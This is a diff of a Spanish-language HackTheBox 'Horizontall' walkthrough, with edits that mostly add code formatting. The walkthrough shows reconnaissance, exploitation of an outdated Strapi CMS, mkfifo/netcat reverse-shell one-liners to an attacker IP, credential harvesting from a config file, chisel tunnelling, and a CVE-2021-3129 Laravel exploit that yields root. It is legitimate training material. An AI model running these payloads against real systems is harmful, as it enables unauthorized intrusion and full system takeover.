@@ -31,13 +31,13 @@ image:
   
 ## Descripción
 
-Horizontall es una máquina easy linux donde estaremos vulnerando la máquina a través de su api de strapi, listaremos sus subdominios y explotaremos una versión antigua desactualizada de strapi accediendo a la máquina víctima. Una vez dentro realizaremos un remote port forwarding y explotaremos el `CVE-2021-3129` obteniendo así el usuario root
+`Horizontall` es una máquina `easy linux` donde estaremos vulnerando la máquina a través de su `api` de `strapi`, listaremos sus `subdominios` y explotaremos una versión antigua desactualizada de `strapi` accediendo a la máquina víctima. Una vez dentro realizaremos un `remote port forwarding` y explotaremos el `CVE-2021-3129` obteniendo así el usuario `root`
 
 ---
 
 ## Reconocimiento
 
-Se comprueba que la `máquina` está activa y se determina su sistema operativo, el ttl de las máquinas linux suele ser 64, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
+Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
 
 ```
 # ping 10.129.95.96
@@ -52,7 +52,7 @@ rtt min/avg/max/mdev = 37.662/42.667/47.672/5.005 ms
 
 ### Nmap
 
-Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap
+Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de nmap
 
 ```
 # sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -v 10.129.95.96 -oG openPorts
@@ -75,7 +75,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.29 seconds
            Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)
 ```
 
-Se procede a realizar un análisis de `detección de servicios y la identificación de versiones` utilizando los puertos abiertos encontrados
+Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados
 
 ```
 # nmap -sCV -p 22,80 10.129.95.96 -oN services                                 
@@ -104,7 +104,7 @@ Nos dirigimos a la página web y se visualiza lo siguiente:
 
 ![](/assets/img/Horizontall/image_1.png)
 
-Abrimos el `/etc/hosts` y añadimos el dominio `horizontall.htb`, debemos hacer esto debido a que estamos ante un virtual hosting 
+Abrimos el `/etc/hosts` y añadimos el dominio `horizontall.htb`, debemos hacer esto debido a que estamos ante un `virtual hosting` 
 
 ```
 127.0.0.1       localhost
@@ -121,7 +121,7 @@ Ahora al acceder a la página web nos encontramos lo siguiente
 
 ![](/assets/img/Horizontall/image_2.png)
 
-Debido a que en la página web no hay nada que nos llame la atención vamos a fuzzear en busca de subdominios
+Debido a que en la página web no hay nada que nos llame la atención vamos a `fuzzear` en busca de `subdominios`
 
 ```
 # wfuzz -c -t 200 --hc 404 --hh 194 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.horizontall.htb' http://horizontall.htb    
@@ -140,7 +140,7 @@ ID           Response   Lines    Word       Chars       Payload
 000047093:   200        19 L     33 W       413 Ch      "api-prod"  
 ```
 
-Los subdominios encontrados los `añadimos al /etc/hosts`
+Los `subdominios` encontrados los `añadimos` al `/etc/hosts`
 
 ```
 27.0.0.1       localhost
@@ -153,11 +153,11 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-En principio `www.horizontall.htb nos muestra el mismo contenido que horizontall.htb`, sin embargo cuando accedemos a `api-prod.horizontal.htb` nos muestra esto
+En principio `www.horizontall.htb` nos muestra el mismo contenido que `horizontall.htb`, sin embargo cuando accedemos a `api-prod.horizontal.htb` nos muestra esto
 
 ![](/assets/img/Horizontall/image_3.png)
 
-Fuzzeamos `api-prod.horizontal.htb en busca de nuevas rutas y nos encontramos users`,reviewsy admin
+Fuzzeamos `api-prod.horizontal.htb` en busca de nuevas rutas y nos encontramos `users`,`reviews`y `admin`
 
 ```
 # wfuzz -c -t 200 --hc 404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/FUZZ 
@@ -209,11 +209,11 @@ En `api-prod.horizontall.htb/admin` nos encontramos esto
 
 ![](/assets/img/Horizontall/image_6.png)
 
-Si usamos wappalyzer para ver con que está creada la web podemos ver que está usando un cms llamado strapi
+Si usamos `wappalyzer` para ver con que está `creada` la `web` podemos ver que está usando un `cms` llamado `strapi`
 
 ![](/assets/img/Horizontall/image_7.png)
 
-Fuzzeamos en busca de nuevas rutas, para saber la version del cms strapi, podemos utilizar la api de strapi que se aloja en `/init`
+`Fuzzeamos` en busca de nuevas `rutas`, para saber la `version` del cms `strapi`, podemos utilizar la `api` de `strapi` que se aloja en `/init`
 
 ```
 # wfuzz -c -t 200 --hc 404 --hh 854 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/admin/FUZZ  
@@ -236,13 +236,13 @@ ID           Response   Lines    Word       Chars       Payload
 000070792:   200        0 L      1 W        144 Ch      "Init"    
 ```
 
-Al acceder a `api-prod.horizontall.htb/admin/init podemos ver la versión de strapi` 
+Al acceder a `api-prod.horizontall.htb/admin/init` podemos ver la `versión` de `strapi` 
 
 ![](/assets/img/Horizontall/image_8.png)
 
 ## Intrusión
 
-Ahora que tenemos la `versión podemos usar searchploit para ver si existe algún exploit` para esta versión de strapi, efectivamente existen varios exploits para esta versión
+Ahora que tenemos la `versión` podemos usar `searchploit` para ver si existe algún `exploit` para esta versión de `strapi`, efectivamente existen varios exploits para esta versión
 
 ```
 # searchsploit strapi 
@@ -257,13 +257,13 @@ Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)        
 Shellcodes: No Results
 ```
 
-Nos descargamos el exploit 
+Nos `descargamos` el `exploit` 
 
 ```
 # searchsploit -m multiple/webapps/50239.py
 ```
 
-Ejecutamos el exploit
+`Ejecutamos` el `exploit`
 
 ```
 # python3 50239.py http://api-prod.horizontall.htb 
@@ -283,7 +283,7 @@ $> ping 10.10.16.8
 [*] Rember this is a blind RCE don't expect to see output 
 ```
 
-Nos ponemos en escucha en espera de trazas icmp y efectivamente tenemos un RCE
+Nos ponemos en `escucha` en espera de `trazas icmp` y efectivamente `tenemos` un `RCE`
 
 ```
 # sudo tcpdump -i tun0 icmp                
@@ -302,13 +302,13 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 0 packets dropped by kernel
 ```
 
-Por lo tanto vamos a mandarnos una reverse shell a nuestro equipo, lo primero es ponernos en escucha mediante netcat por el puerto 443
+Por lo tanto vamos a mandarnos una `reverse shell` a nuestro equipo, lo primero es ponernos en escucha mediante `netcat` por el puerto `443`
 
 ```
 # nc -nlvp 443
 ```
 
-Nos mandamos una reverse shell a nuestro equipo
+Nos mandamos una `reverse shell` a nuestro equipo
 
 ```
 $> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.8 443 >/tmp/f
@@ -316,7 +316,7 @@ $> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.8 443 >/tmp/f
 [*] Rember this is a blind RCE don't expect to see output
 ```
 
-Una vez en la máquina víctima vamos a realizar un tratamiento a la TTY
+Una vez en la máquina víctima vamos a realizar un `tratamiento` a la `TTY`
 
 ```
 # nc -nlvp 443 
@@ -326,14 +326,14 @@ sh: 0: can't access tty; job control turned off
 $ 
 ```
 
-Obtenemos las dimensiones de nuestra pantalla 
+Obtenemos las `dimensiones` de nuestra `pantalla` 
 
 ```
 # stty size
 45 183
 ```
 
-Efectuamos el tratamiento a la TTY
+Efectuamos el `tratamiento` a la `TTY`
 
 ```
 # script /dev/null -c bash
@@ -351,7 +351,7 @@ Efectuamos el tratamiento a la TTY
 [ENTER]
 ```
 
-Ya tenemos un consola completamente interactiva
+Ya tenemos un `consola` completamente `interactiva`
 
 ```
 strapi@horizontall:~/myapi$ whoami
@@ -360,7 +360,7 @@ strapi
 
 ## Privilege Escalation
 
-Inspeccionando el código me he encontrado con estas credenciales del usuario developer
+Inspeccionando el código me he encontrado con estas `credenciales` del usuario `developer`
 
 ```
 strapi@horizontall:~/myapi/config/environments/development$ cat database.json 
@@ -383,7 +383,7 @@ strapi@horizontall:~/myapi/config/environments/development$ cat database.json
 }
 ```
 
-Intentamos ver si el usuario developer utiliza las misma `contraseña para su usuario en el sistema y para la base de datos`. Nos damos cuenta que solo existe un usuario, y es el que nos ha creado el exploit, por lo tanto no hay nada interesante en la base de datos. Tampoco podemos reutilizar la contraseña para convertirnos en el usuario developer
+Intentamos ver si el usuario `developer` utiliza las misma `contraseña` para su usuario en el `sistema` y para la `base de datos`. Nos damos cuenta que solo existe un usuario, y es el que nos ha creado el exploit, por lo tanto no hay nada interesante en la base de datos. Tampoco podemos reutilizar la contraseña para convertirnos en el usuario developer
 
 ```
 strapi@horizontall:~/myapi/config/environments/development$ su developer
@@ -460,7 +460,7 @@ mysql> select username,password from strapi_administrator;
 1 row in set (0.00 sec)
 ```
 
-Vamos a ver los servicios internos
+Vamos a `ver` los `servicios` internos
 
 ```
 strapi@horizontall:/tmp/scripts$ netstat -nat
@@ -477,13 +477,13 @@ tcp6       0      0 :::80                   :::*                    LISTEN
 tcp6       0      0 :::22                   :::*                    LISTEN    
 ```
 
-El que más me llama la atención es el que se aloja en el puerto 8000
+El que más me llama la atención es el que se aloja en el `puerto 8000`
 
 ```
 strapi@horizontall:/tmp/scripts$ curl http://127.0.0.1
 ```
 
-Al hacerle un curl, vemos que está corriendo `Laravel v8 (PHP v7.4.18)`, al hacer una búsqueda son searchsploit nos encontramos un exploit para esta version de Laravel. Mediante remote port forwarding vamos a traernos el puerto 8000 de la `máquina víctima a nuestro equipo`. Lo primero que debemos hacer es descargarnos este release [https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_darwin_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_darwin_amd64.gz)
+Al hacerle un `curl`, vemos que está corriendo `Laravel v8 (PHP v7.4.18)`, al hacer una búsqueda son `searchsploit` nos encontramos un `exploit` para esta version de Laravel. Mediante `remote port forwarding` vamos a traernos el `puerto 8000` de la `máquina víctima` a `nuestro equipo`. Lo primero que debemos hacer es descargarnos este release [https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_darwin_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_darwin_amd64.gz)
 
 La descomprimimos
 
@@ -491,25 +491,25 @@ La descomprimimos
 # gunzip chisel_1.9.1_darwin_amd64.gz
 ```
 
-Nos ponemos en escucha con python en el mismo directorio donde se encuentra el archivo de chisel
+Nos ponemos en `escucha` con python en el `mismo directorio` donde se encuentra el archivo de chisel
 
 ```
 # python -m http.server 80
 ```
 
-Nos descargamos el archivo en la máquina víctima
+Nos `descargamos` el `archivo` en la máquina víctima
 
 ```
 # wget http://10.10.16.8/chisel_1.9.1_darwin_amd64.gz`
 ```
 
-Desde la máquina víctima ejecutamos estas instrucciones
+Desde la máquina víctima `ejecutamos` estas `instrucciones`
 
 ```
 strapi@horizontall:/tmp/scripts$ ./chisel_1.9.1_linux_amd64 client 10.10.16.8:1234 R:8000:127.0.0.1:8000 
 ```
 
-Desde nuestro equipo ejecutamos estas instrucciones
+Desde nuestro equipo `ejecutamos` estas `instrucciones`
 
 ```
 # ./chisel_1.9.1_linux_amd64 server -p 1234 --reverse  
@@ -519,7 +519,7 @@ Una vez ejecutados estos comandos podemos visualizar la página accediendo a `ht
 
 Buscando un exploit para esta versión de laravel nos encontramos con [https://github.com/nth347/CVE-2021-3129_exploit.git](https://github.com/nth347/CVE-2021-3129_exploit.git)
 
-Debido a que hemos hecho remote port forwarding podemos ejecutar el exploit en nuestra máquina local. Efectivamente el exploit funciona y obtenemos `ejecución de comandos como usuario root`
+Debido a que hemos hecho `remote port forwarding` podemos `ejecutar` el `exploit` en nuestra máquina local. Efectivamente el exploit funciona y obtenemos `ejecución de comandos` como usuario `root`
 
 ```
 # ./exploit.py http://localhost:8000 Monolog/RCE1 id
@@ -544,19 +544,19 @@ uid=0(root) gid=0(root) groups=0(root)
 [+] Logs cleared
 ```
 
-Vamos a mandarnos una shell a nuestro equipo, lo primero nos ponemos en escucha por el puerto 443
+Vamos a mandarnos una `shell` a nuestro equipo, lo primero nos ponemos en `escucha` por el `puerto 443`
 
 ```
 # nc -nlvp 443
 ```
 
-Nos mandamos una shell como root a nuestro equipo
+Nos mandamos una `shell` como `root` a nuestro equipo
 
 ```
 # ./exploit.py http://localhost:8000 Monolog/RCE1 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.8 443 >/tmp/f'
 ```
 
-Efectivamente ya nos hemos convertido en usuario root
+Efectivamente ya nos hemos `convertido` en usuario `root`
 
 ```
 root@horizontall:/home/developer/myproject/public# whoami
